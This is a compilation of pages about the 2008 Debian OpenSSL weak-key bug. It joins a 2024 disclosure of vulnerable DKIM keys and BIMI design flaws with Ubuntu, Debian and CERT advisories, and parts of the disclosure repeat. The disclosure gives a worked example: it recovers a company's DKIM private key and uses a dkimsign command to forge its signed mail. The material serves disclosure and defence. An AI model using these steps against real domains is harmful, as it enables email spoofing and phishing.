*entrust.com* has a BIMI default record configured at *default.\_bimi.entrust.com*.
Therefore, all DKIM-signed emails automatically get BIMI treatment.
The record looks like this:

```
v=BIMI1;l=https://bimi.entrust.net/entrust.com/logo.svg;a=https://bimi.entrust.net/entrust.com/certchain.pem
```

The URLs point to a logo in SVG format (*l=*)
and a corresponding certificate (*a=*).

A BIMI-supporting email service receiving an email with a valid DKIM signature for *entrust.com* - which
we can generate, as we have the private key - will show a BIMI logo.

By the way, have I mentioned that Entrust is one of only two companies that sell
BIMI certificates?

### Any other security problems with BIMI?

Yes, after learning about this, I started reading the specification. It is extremely
weird and has
[obvious security design flaws](https://mailarchive.ietf.org/arch/msg/bimi/PS8Xf1hQ41oCAwtsUvVsbRSs34Q/).
It does "trustworthy" things like explaining
that certain things (that are crucial for a secure implementation) are explained
*"elsewhere"* or *"in other documents"* - without revealing
where *"elsewhere"* is or where to
find these *"other documents"*.

### I am an email provider. Should I implement BIMI?

No.

### I develop an email client. Should I implement BIMI?

It is impossible to implement BIMI in mail user agents in a secure way based on its specification.
You need additional security measures that are explained
*"elsewhere"* and *"in other documents"*.

### I am developing a mail server. What should I do about BIMI?

You could implement BIMI troll mode by inserting a logo "say no to BIMI"
into emails with BIMI records configured.

### Wait, that works? What about the certificates and all that?

It would work in any MUA that implements the current version of
the BIMI specification. However, I am not aware of any that do.

According to the specification, the mail server checks the certificate and sets
those headers. The MUA
should trust the MTA based on *"locally defined checks*". It is not explained what that
means. (Possibly, that explanation is *"elsewhere"*
or *"in other documents"*.)

### Why have you created a logo for this vulnerability?

I haven't. It is
[a free icon (CC0) from SVG Repo](https://www.svgrepo.com/svg/41964/confetti).

### You celebrated on the wrong day!

I know. I published this page on May 12th.
The Debian OpenSSL bug was announced on May 13th, 2008.

It was a simple mistake. At some point during
the preparation of this web page, I had looked up the date, but I must have misremembered it.
Therefore, I announced the 16th anniversary of the Debian OpenSSL bug one day too soon.

# USN-612-1: OpenSSL vulnerability

13 May 2008

OpenSSL vulnerability

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 8.04](/security/notices?release=hardy)
* [Ubuntu 7.10](/security/notices?release=gutsy)
* [Ubuntu 7.04](/security/notices?release=feisty)

## Packages

* [openssl](/security/cves?package=openssl) -

## Details

A weakness has been discovered in the random number generator used

by OpenSSL on Debian and Ubuntu systems. As a result of this

weakness, certain encryption keys are much more common than they

should be, such that an attacker could guess the key through a

brute-force attack given minimal knowledge of the system. This

particularly affects the use of encryption keys in OpenSSH, OpenVPN

and SSL certificates.

This vulnerability only affects operating systems which (like

Ubuntu) are based on Debian. However, other systems can be

indirectly affected if weak keys are imported into them.

We consider this an extremely serious vulnerability, and urge all

users to act immediately to secure their systems. ([CVE-2008-0166](/security/CVE-2008-0166))

== Who is affected ==

Systems which are running any of the following releases:

* Ubuntu 7.04 (Feisty)
* Ubuntu 7.10 (Gutsy)
* Ubuntu 8.04 LTS (Hardy)
* Ubuntu "Intrepid Ibex" (development): libssl <= 0.9.8g-8
* Debian 4.0 (etch) (see corresponding Debian security advisory)

and have openssh-server installed or have been used to create an

OpenSSH key or X.509 (SSL) certificate.

All OpenSSH and X.509 keys generated on such systems must be

considered untrustworthy, regardless of the system on which they

are used, even after the update has been applied.

This includes the automatically generated host keys used by OpenSSH,

which are the basis for its server spoofing and machine-in-the-middle

protection.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

# 16 years of CVE-2008-0166

# Debian OpenSSL Bug

![Confetti Icon](party.svg)
## Breaking DKIM and BIMI in 2024

On May ~~12th~~ 13th, 2008,
[Debian Linux
announced the discovery of a severe security vulnerability in its OpenSSL package](https://lists.debian.org/debian-security-announce/2008/msg00152.html).
A patch in Debian's and Ubuntu's OpenSSL packages broke the random number generator,
effectively limiting the number of possible keys to
a few ten thousand plausible variations.

To celebrate the sixteenth anniversary of this discovery, I am hereby disclosing
that many DKIM setups still used keys vulnerable to this bug in 2024.
This also affects BIMI due to a poorly designed specification.

I presented these findings
[at the miniDebConf Berlin](https://berlin2024.mini.debconf.org/talks/17-breaking-dkim-and-bimi-with-the-2008-debian-openssl-bug/).
A video recording is available
([Youtube](https://www.youtube.com/watch?v=umceD9-QK7g), [direct download high quality](https://meetings-archive.debian.net/pub/debian-meetings/2024/MiniDebConf-Berlin/33-breaking-dkim-and-bimi-with-the-2008-debian-openssl-bug.webm), [direct download low quality](https://meetings-archive.debian.net/pub/debian-meetings/2024/MiniDebConf-Berlin/33-breaking-dkim-and-bimi-with-the-2008-debian-openssl-bug.lq.webm)).

### DKIM keys vulnerable to Debian OpenSSL bug

DKIM is a mechanism that allows sending mail servers to sign emails with a cryptographic
key published via a DNS TXT record.

By scanning DKIM keys with my tool [badkeys](https://badkeys.info/),
I discovered a surprisingly large number of hosts vulnerable to the 2008 Debian
OpenSSL bug. This trivially allowed sending emails with forged DKIM signatures for those
hosts and thereby also passing DMARC checks.

The hosts included notable names like *@cisco.com*, *@oracle.com*,
*@skype.net*, *@github.partners*, *@partner.crowdstrike.com*,
*@partners.dropbox.com*, *@1password.com*, and *@seznam.cz* (unfixed at disclosure, fixed now).

### How many keys were vulnerable?

By scanning the Tranco Top 1 Million list, I collected 355,055 TXT records
with a valid RSA key. Ed25519 keys
were only found in negligible numbers (to be precise, two). DKIM does not support
other key types.

Of the records with RSA keys, 855 were vulnerable to CVE-2008-0166 - around 0.24 %.
777 records contained identical keys. Overall, there were 22 unique vulnerable
keys.

I found 21 additional records with vulnerable keys through other methods.
(Details about the [scanning methodology can be found here](scandkim.html).)

### Most keys came from one company

Most records in the large set of 777 identical keys
were configured as a CNAME to a host belonging to
the company Cakemail.

I tried disclosing this issue to Cakemail.
The affected host has
a [security.txt](https://md02.com/.well-known/security.txt)
file with a security contact address (*security@cakemail.com*) and a link to a PGP
key that does not work (404 error).

After trying to contact
*security@cakemail.com*, I got this error message:
*"We're writing to let you know that the group you tried to contact (security) may not exist, or you may not have permission to post messages to the group."*

Therefore, I did not directly communicate with Cakemail, but they appear to have replaced
their DKIM key. I have disclosed this
issue to many affected organizations. Some have probably contacted Cakemail.

### Why are people using keys with a vulnerability from 2008 in 2024?

I can only speculate, but it may have to do with timing.
The Debian OpenSSL bug was introduced in 2006. It was discovered and fixed in 2008.
The DKIM specification was published as [RFC 4871](https://datatracker.ietf.org/doc/html/rfc4871) in 2007.

DKIM has no requirement to rotate keys. It appears that a sizeable number of companies
configured DKIM TXT records in 2007 and never changed them.

### Why ~~is~~ was seznam.cz listed as unfixed?

The security team at Seznam - a Czech search engine and email provider -
did not believe me when I reported this issue.
They assume that as they are not actively using that key
(*beta.\_domainkey.seznam.cz*), that means that it cannot be used to forge emails.
This is, of course, not true.

### Any other disclosure stories?

While disclosing this issue, I had plenty of bad experiences
with bug bounty programs. In multiple instances, triagers showed
incompetent or highly problematic behavior. I am still in the process of trying
to clarify some issues, I may share some stories at a later point in time.

### Did you find any other vulnerabilities?

I found some RSA keys with very short key sizes, some with 512 bits, some even
smaller. Those can be broken on consumer hardware these days. I have not looked closer into
this.

I also found some unparseable or defective keys. I have not found any other
interesting vulnerabilities.

Generally, large parts of the DKIM ecosystem use substandard cryptographic security.
The majority of DKIM keys use RSA with 1024 bits. The standard recommendation for RSA keys is
to use a minimum key size of 2048 bit. While it has been assumed that powerful
attackers may be able to break 1024-bit RSA for more than 20 years,
such attacks have not been publicly documented.

### How can I check if my DKIM keys are affected by this vulnerability?

The latest version of badkeys allows you to scan DKIM keys directly. (Use
version 0.0.11 or above, as previous versions had a bug that would prevent some DKIM
keys from being scanned.)

badkeys is a Python tool that can be [installed via pip](https://pypi.org/project/badkeys/).

With the parameter *--dkim*, it checks DKIM records in text files. It supports common
formats like DNS zone files or the output from tools like dig or host:

```
$ badkeys -aw --dkim example.org.zone
rsa[2048] key ok, example.org.zone[12]
```

The *-a* parameter shows all keys found, not
just vulnerable ones.
The *-w* parameter enables warnings about insecure or discouraged key
sizes and exponent values.

badkeys can also directly scan DKIM TXT records with the parameter *--dkim-dns*:

```
$ badkeys -aw --dkim-dns 20230601._domainkey.gmail.com dkim._domainkey.entrust.com
rsa[2048] key ok, 20230601._domainkey.gmail.com
blocklist/debianssl vulnerability, rsa[1024], dkim._domainkey.entrust.com
rsawarnings/too_small vulnerability, rsa[1024], dkim._domainkey.entrust.com
```

Obvious caveat: a tool like badkeys can
never find all possible vulnerabilities or compromised keys.

### What is BIMI?

It is a moneymaking scheme invented by certificate authorities.

### What is BIMI, really?

BIMI allows publishing a logo in SVG format that some email services will display
alongside your emails. While not strictly required by the specification,
usually, that will only happen if you also buy an expensive certificate (so-called
Verified Mark Certificate) that asserts that this is your logo.

Those certificates are very expensive (above $1,000 per year).

Here's a Gmail screenshot showing some logos:

![Gmail screenshot](gmaillogos.avif)
### What does BIMI have to do with this vulnerability?

While testing to send DKIM-signed emails, I noticed
that some would show a company logo in Gmail.

BIMI is designed in a way that when you publish a default BIMI
record, all DKIM-signed emails will automatically get BIMI treatment and show a logo.
In some cases, I only controlled the DKIM key of a subdomain, but even then,
the BIMI logo configured for the main domain is shown automatically.

### Wait, haven't you just said that I need an expensive certificate? Doesn't that mean that there needs to be some signature involved from that certificate?

No, and I was very surprised by this.

The [BIMI spec](https://www.ietf.org/archive/id/draft-brand-indicators-for-message-identification-05.html)
is written in a way that there is no cryptographic connection
between the certificate and the DKIM key. As soon as one is able to sign a mail with DKIM,
it passes BIMI.

While BIMI certificates are standard X.509 certificates that contain a cryptographic
key, that key is not used at all.

Certificate authorities in other areas, e.g., in the WebPKI,
are required to guarantee some basic security checking of cryptographic keys, disallow
short RSA keys, and revoke known-compromised keys. No such mechanisms exist for BIMI
and DKIM.

### Can you explain this with an example?

Sure. Let's take the domain *entrust.com*. It
~~has~~ had a DKIM TXT record configured
at *dkim.\_domainkey.entrust.com*:

```
v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCyGF0xzO7Eig1H8QdIErjEKOGnIVvoLU5VjcMRBRWZK65NinL+gVnjuMD2mYdjC3f+7sQCWxGDSKIFn/bB+iXxO2x1/ktkwXHQfQ/9FcFuy+LE0Snsm0SwXN/2l1m5f9e1xdswC+dzHt6DIpDSDENsRal019YKQTqwVyB++7QORwIDAQAB
```

This is a 1024-bit RSA key generated with a version of Debian vulnerable to
CVE-2008-0166. We can use badkeys to figure out that
the [private key is this one](https://github.com/badkeys/debianopenssl/blob/main/rsa1024/ssl/le32/25731-rnd.key):

```

-----END RSA PRIVATE KEY-----
```

We can use a tool like [dkimsign](https://manpages.ubuntu.com/manpages/trusty/man1/dkimsign.1.html) (part of [dkimpy](https://pypi.org/project/dkimpy/))
to sign a mail with a sender using
an *@entrust.com* mail address:

```
$ dkimsign dkim entrust.com 25731-rnd.key < unsigned.txt > signed.txt
```

You can find a [signed test mail here](testmail.msg).

*entrust.com* has a BIMI default record configured at *default.\_bimi.entrust.com*.
Therefore, all DKIM-signed emails automatically get BIMI treatment.
The record looks like this:

```
v=BIMI1;l=https://bimi.entrust.net/entrust.com/logo.svg;a=https://bimi.entrust.net/entrust.com/certchain.pem
```

The URLs point to a logo in SVG format (*l=*)
and a corresponding certificate (*a=*).

A BIMI-supporting email service receiving an email with a valid DKIM signature for *entrust.com* - which
we can generate, as we have the private key - will show a BIMI logo.

By the way, have I mentioned that Entrust is one of only two companies that sell
BIMI certificates?

### Any other security problems with BIMI?

Yes, after learning about this, I started reading the specification. It is extremely
weird and has
[obvious security design flaws](https://mailarchive.ietf.org/arch/msg/bimi/PS8Xf1hQ41oCAwtsUvVsbRSs34Q/).
It does "trustworthy" things like explaining
that certain things (that are crucial for a secure implementation) are explained
*"elsewhere"* or *"in other documents"* - without revealing
where *"elsewhere"* is or where to
find these *"other documents"*.

### I am an email provider. Should I implement BIMI?

No.

### I develop an email client. Should I implement BIMI?

It is impossible to implement BIMI in mail user agents in a secure way based on its specification.
You need additional security measures that are explained
*"elsewhere"* and *"in other documents"*.

### I am developing a mail server. What should I do about BIMI?

You could implement BIMI troll mode by inserting a logo "say no to BIMI"
into emails with BIMI records configured.

### Wait, that works? What about the certificates and all that?

It would work in any MUA that implements the current version of
the BIMI specification. However, I am not aware of any that do.

According to the specification, the mail server checks the certificate and sets
those headers. The MUA
should trust the MTA based on *"locally defined checks*". It is not explained what that
means. (Possibly, that explanation is *"elsewhere"*
or *"in other documents"*.)

### Why have you created a logo for this vulnerability?

I haven't. It is
[a free icon (CC0) from SVG Repo](https://www.svgrepo.com/svg/41964/confetti).

### You celebrated on the wrong day!

I know. I published this page on May 12th.
The Debian OpenSSL bug was announced on May 13th, 2008.

It was a simple mistake. At some point during
the preparation of this web page, I had looked up the date, but I must have misremembered it.
Therefore, I announced the 16th anniversary of the Debian OpenSSL bug one day too soon.

### Anything else?

If you need help with email security, DKIM, or cryptography,
[you can find more information and reach me here](https://itsec.hboeck.de/).

These days, I spend a lot less time working on IT security. Most of my time, I try
to understand the technologies we need to fix the climate crisis and create hopefully
insightful and well-researched content. If that sounds interesting to you, you can

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 8.04

* [openssh-server](https://launchpad.net/ubuntu/%2Bsource/openssh)
  -
  [1:4.7p1-8ubuntu1.1](https://launchpad.net/ubuntu/%2Bsource/openssh/1%3A4.7p1-8ubuntu1.1)
* [openssh-client](https://launchpad.net/ubuntu/%2Bsource/openssh)
  -
  [1:4.7p1-8ubuntu1.1](https://launchpad.net/ubuntu/%2Bsource/openssh/1%3A4.7p1-8ubuntu1.1)

##### Ubuntu 7.10

* [openssh-server](https://launchpad.net/ubuntu/%2Bsource/openssh)
  -
  [1:4.6p1-5ubuntu0.3](https://launchpad.net/ubuntu/%2Bsource/openssh/1%3A4.6p1-5ubuntu0.3)
* [openssh-client](https://launchpad.net/ubuntu/%2Bsource/openssh)
  -
  [1:4.6p1-5ubuntu0.3](https://launchpad.net/ubuntu/%2Bsource/openssh/1%3A4.6p1-5ubuntu0.3)

##### Ubuntu 7.04

* [openssh-server](https://launchpad.net/ubuntu/%2Bsource/openssh)
  -
  [1:4.3p2-8ubuntu1.3](https://launchpad.net/ubuntu/%2Bsource/openssh/1%3A4.3p2-8ubuntu1.3)
* [openssh-client](https://launchpad.net/ubuntu/%2Bsource/openssh)
  -
  [1:4.3p2-8ubuntu1.3](https://launchpad.net/ubuntu/%2Bsource/openssh/1%3A4.3p2-8ubuntu1.3)

Updating your system:

1. Install the security updates

   Once the update is applied, weak user keys will be automatically

   rejected where possible (though they cannot be detected in all

   cases). If you are using such keys for user authentication,

   they will immediately stop working and will need to be replaced

   (see step 3).

   OpenSSH host keys can be automatically regenerated when the

   OpenSSH security update is applied. The update will prompt for

   confirmation before taking this step.
2. Update OpenSSH known\_hosts files

   The regeneration of host keys will cause a warning to be displayed

   when connecting to the system using SSH until the host key is

   updated in the known\_hosts file. The warning will look like this:

   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

   @ WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED! @

   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

   IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!

   Someone could be eavesdropping on you right now (man-in-the-middle

   attack)! It is also possible that the RSA host key has just been

   changed.

   In this case, the host key has simply been changed, and you

   should update the relevant known\_hosts file as indicated in the

   error message.
3. Check all OpenSSH user keys

   The safest course of action is to regenerate all OpenSSH user

   keys, except where it can be established to a high degree of

   certainty that the key was generated on an unaffected system.

   Check whether your key is affected by running the ssh-vulnkey

   tool, included in the security update. By default, ssh-vulnkey

   will check the standard location for user keys (~/.ssh/id\_rsa,

   ~/.ssh/id\_dsa and ~/.ssh/identity), your authorized\_keys file

   (~/.ssh/authorized\_keys and ~/.ssh/authorized\_keys2), and the

   system's host keys (/etc/ssh/ssh\_host\_dsa\_key and

   /etc/ssh/ssh\_host\_rsa\_key).

   To check all your own keys, assuming they are in the standard

   locations (~/.ssh/id\_rsa, ~/.ssh/id\_dsa, or ~/.ssh/identity):

   $ ssh-vulnkey

   To check all keys on your system:

   $ sudo ssh-vulnkey -a

   To check a key in a non-standard location:

   $ ssh-vulnkey /path/to/key

   If ssh-vulnkey says "Unknown (no blacklist information)",

   then it has no information about whether that key is affected.

   If in doubt, destroy the key and generate a new one.
4. Regenerate any affected user keys

   OpenSSH keys used for user authentication must be manually

   regenerated, including those which may have since been

   transferred to a different system after being generated.

   New keys can be generated using ssh-keygen, e.g.:

   $ ssh-keygen

   Generating public/private rsa key pair.

   Enter file in which to save the key (/home/user/.ssh/id\_rsa):

   Enter passphrase (empty for no passphrase):

   Enter same passphrase again:

   Your identification has been saved in /home/user/.ssh/id\_rsa.

   Your public key has been saved in /home/user/.ssh/id\_rsa.pub.

   The key fingerprint is:

   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00 user@host
5. Update authorized\_keys files (if necessary)

   Once the user keys have been regenerated, the relevant public

   keys must be propagated to any authorized\_keys files on

   remote systems. Be sure to delete the affected key.

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 8.04

* [openvpn](https://launchpad.net/ubuntu/%2Bsource/openvpn)
  -
  [2.1~rc7-1ubuntu3.1](https://launchpad.net/ubuntu/%2Bsource/openvpn/2.1~rc7-1ubuntu3.1)

##### Ubuntu 7.10

* [openvpn](https://launchpad.net/ubuntu/%2Bsource/openvpn)
  -
  [2.0.9-8ubuntu0.1](https://launchpad.net/ubuntu/%2Bsource/openvpn/2.0.9-8ubuntu0.1)

##### Ubuntu 7.04

* [openvpn](https://launchpad.net/ubuntu/%2Bsource/openvpn)
  -
  [2.0.9-5ubuntu0.1](https://launchpad.net/ubuntu/%2Bsource/openvpn/2.0.9-5ubuntu0.1)

Once the update is applied, weak shared encryption keys and

SSL/TLS certificates will be rejected where possible (though

they cannot be detected in all cases). If you are using such

keys or certificates, OpenVPN will not start and the keys or

certificates will need to be regenerated.

The safest course of action is to regenerate all OpenVPN

certificates and key files, except where it can be established

to a high degree of certainty that the certificate or shared key

was generated on an unaffected system.

Once the update is applied, you can check for weak OpenVPN shared

secret keys with the openvpn-vulnkey command.

$ openvpn-vulnkey /path/to/key

OpenVPN shared keys can be regenerated using the openvpn command.

$ openvpn --genkey --secret

Additionally, you can check for weak SSL/TLS certificates by

installing openssl-blacklist via your package manager, and using

the openssl-vulkey command.

$ openssl-vulnkey /path/to/key

Please note that openssl-vulnkey only checks RSA private keys

with 1024 and 2048 bit lengths. If in doubt, destroy the

certificate and/or key and generate a new one. Please consult the

OpenVPN documention when recreating SSL/TLS certificates.

Additionally, if certificates have been generated for use on other

systems, they must be found and replaced as well.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

## Debian and Ubuntu OpenSSL packages contain a predictable random number generator

#### Vulnerability Note VU#925211

Original Release Date: 2008-05-15 | Last Revised: 2008-06-03

---

### Overview

A vulnerability in the OpenSSL package included with the Debian GNU/Linux operating system and its derivatives may cause weak cryptographic keys to be generated.

### Description

| A weakness exists in the random number generator used by the OpenSSL package included with the Debian GNU/Linux operating system and derivative systems that causes the generated numbers to be predictable. As a result of this weakness, certain encryption keys are much more common than they should be. This vulnerability affects cryptographic applications that use keys generated by the flawed versions of the OpenSSL package. Affected keys include SSH keys, OpenVPN keys, DNSSEC keys, and key material for use in X.509 certificates and session keys used in SSL/TLS connections. Any of these keys generated using the affected systems on or after 2006-09-17 may be vulnerable. Keys generated with GnuPG or GNUTLS on the affected systems are not vulnerable because these applications use their own random number generators and not the one from the flawed version of OpenSSL.  Note that this vulnerability is specific to Debian, Ubuntu Linux and other Debian-derived operating systems. Other systems can be indirectly affected if weak keys generated by the vulnerable systems are imported into them. |
| --- |

### Impact

| A remote, unauthenticated attacker with minimal knowledge of the vulnerable system and the ability to conduct a brute force attack against an affected application may be able to guess secret key material. Secondary impacts include authenticated access to the system through the affected service or the ability to perform man-in-the-middle attacks. |
| --- |

### Solution

| **Apply a patch from the vendor and regenerate key material**Patches have been release by the affected vendors. Users are encouraged to review the Systems Affected section of this document and apply the updates it refers to.Due to the nature of the flaw, any key material generated by the vulnerable versions of the OpenSSL package should be considered fatally defective. Additionally, all DSA keys ever used on affected Debian systems for signing or authentication purposes should be considered compromised since the Digital Signature Algorithm relies on a secret random value used during signature generation. After the software updates are applied, this key material must be regenerated with the updated version of the software. Vendor-specific instructions for doing this can also be found in the Systems Affected section of this document. |

Package        : openssh
Vulnerability  : predictable random number generator
Problem type   : remote
Debian-specific: yes
CVE Id(s)      : CVE-2008-0166

The recently announced vulnerability in Debian's openssl package
(DSA-1571-1, CVE-2008-0166) indirectly affects OpenSSH.  As a result,
all user and host keys generated using broken versions of the openssl
package must be considered untrustworthy, even after the openssl update
has been applied.

1. Install the security updates

   This update contains a dependency on the openssl update and will
   automatically install a corrected version of the libss0.9.8 package,
   and a new package openssh-blacklist.

   Once the update is applied, weak user keys will be automatically
   rejected where possible (though they cannot be detected in all
   cases).  If you are using such keys for user authentication, they
   will immediately stop working and will need to be replaced (see
   step 3).

   OpenSSH host keys can be automatically regenerated when the OpenSSH
   security update is applied.  The update will prompt for confirmation
   before taking this step.

2. Update OpenSSH known_hosts files

   The regeneration of host keys will cause a warning to be displayed when
   connecting to the system using SSH until the host key is updated in the
   known_hosts file.  The warning will look like this:

   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
   @    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
   IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
   Someone could be eavesdropping on you right now (man-in-the-middle attack)!
   It is also possible that the RSA host key has just been changed.

   In this case, the host key has simply been changed, and you should update
   the relevant known_hosts file as indicated in the error message.

   It is recommended that you use a trustworthy channel to exchange the
   server key.  It is found in the file /etc/ssh/ssh_host_rsa_key.pub on
   the server; it's fingerprint can be printed using the command:

      ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub

   In addition to user-specific known_hosts files, there may be a
   system-wide known hosts file /etc/ssh/known_hosts.  This is file is
   used both by the ssh client and by sshd for the hosts.equiv
   functionality.  This file needs to be updated as well.

3. Check all OpenSSH user keys

   The safest course of action is to regenerate all OpenSSH user keys,
   except where it can be established to a high degree of certainty that the
   key was generated on an unaffected system.

   Check whether your key is affected by running the ssh-vulnkey tool, included
   in the security update.  By default, ssh-vulnkey will check the standard
   location for user keys (~/.ssh/id_rsa, ~/.ssh/id_dsa and ~/.ssh/identity),
   your authorized_keys file (~/.ssh/authorized_keys and
   ~/.ssh/authorized_keys2), and the system's host keys
   (/etc/ssh/ssh_host_dsa_key and /etc/ssh/ssh_host_rsa_key).

   To check all your own keys, assuming they are in the standard
   locations (~/.ssh/id_rsa, ~/.ssh/id_dsa, or ~/.ssh/identity):

     ssh-vulnkey

   To check all keys on your system:

     sudo ssh-vulnkey -a

   To check a key in a non-standard location:

     ssh-vulnkey /path/to/key

   If ssh-vulnkey says "Unknown (no blacklist information)", then it has no
   information about whether that key is affected.  In this case, you
   can examine the modification time (mtime) of the file using "ls -l".
   Keys generated before September 2006 are not affected.  Keep in mind
   that, although unlikely, backup procedures may have changed the file
   date back in time (or the system clock may have been incorrectly
   set).

   If in doubt, generate a new key and remove the old one from any
   servers.

4. Regenerate any affected user keys

   OpenSSH keys used for user authentication must be manually regenerated,
   including those which may have since been transferred to a different system
   after being generated.

   New keys can be generated using ssh-keygen, e.g.:

   $ ssh-keygen
   Generating public/private rsa key pair.
   Enter file in which to save the key (/home/user/.ssh/id_rsa):
   Enter passphrase (empty for no passphrase):
   Enter same passphrase again:
   Your identification has been saved in /home/user/.ssh/id_rsa.
   Your public key has been saved in /home/user/.ssh/id_rsa.pub.
   The key fingerprint is:
   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00 user@host

5. Update authorized_keys files (if necessary)

   Once the user keys have been regenerated, the relevant public keys
   must be propagated to any authorized_keys files (and authorized_keys2
   files, if applicable) on remote systems.  Be sure to delete the lines
   containing old keys from those files..

In addition to countermeasures to mitigate the randomness vulnerability,
this OpenSSH update fixes several other vulnerabilities:

CVE-2008-1483:
   Timo Juhani Lindfors discovered that, when using X11 forwarding, the
   SSH client selects an X11 forwarding port without ensuring that it
   can be bound on all address families. If the system is configured
   with IPv6 (even if it does not have working IPv6 connectivity), this
   could allow a local attacker on the remote server to hijack X11
   forwarding.

CVE-2007-4752:
   Jan Pechanec discovered that ssh fails back to creating a trusted X11
   cookie if creating an untrusted cookie fails, potentially exposing
   the local display to a malicious remote server when using X11
   forwarding.

For the stable distribution (etch), these problems have been fixed in
version 4.3p2-9etch1.  Currently, only a subset of all supported
architectures have been built; further updates will be provided when
they become available.

For the unstable distribution (sid) and the testing distribution
(lenny), these problems have been fixed in version 4.7p1-9.

We recommend that you upgrade your openssh packages and take the
measures indicated above.

# USN-612-7: OpenSSH update

20 May 2008

OpenSSH update

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 6.06](/security/notices?release=dapper)

## Packages

* [openssh](/security/cves?package=openssh) -

## Details

USN-612-2 introduced protections for OpenSSH, related to the OpenSSL

vulnerabilities addressed by USN-612-1. This update provides the

corresponding updates for OpenSSH in Ubuntu 6.06 LTS. While the OpenSSL

in Ubuntu 6.06 is not vulnerable, this update will block weak keys

generated on systems that may have been affected themselves.

Original advisory details:

A weakness has been discovered in the random number generator used

by OpenSSL on Debian and Ubuntu systems. As a result of this

weakness, certain encryption keys are much more common than they

should be, such that an attacker could guess the key through a

brute-force attack given minimal knowledge of the system. This

particularly affects the use of encryption keys in OpenSSH, OpenVPN

and SSL certificates.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 6.06

* [openssh-server](https://launchpad.net/ubuntu/%2Bsource/openssh)
  -
  [1:4.2p1-7ubuntu3.4](https://launchpad.net/ubuntu/%2Bsource/openssh/1%3A4.2p1-7ubuntu3.4)

In general, a standard system upgrade is sufficient to effect the

necessary changes.

# openssh 1:4.2p1-7ubuntu3.4 source package in Ubuntu

## Changelog

```
openssh (1:4.2p1-7ubuntu3.4) dapper-security; urgency=low

  * Mitigate OpenSSL security vulnerability (CVE-2008-0166):
    - Add key blacklisting support. Keys listed in
      /etc/ssh/blacklist.TYPE-LENGTH will be rejected for authentication by
      sshd, unless "PermitBlacklistedKeys yes" is set in
      /etc/ssh/sshd_config.
    - Add a new program, ssh-vulnkey, which can be used to check keys
      against these blacklists.
    - Depend on openssh-blacklist.
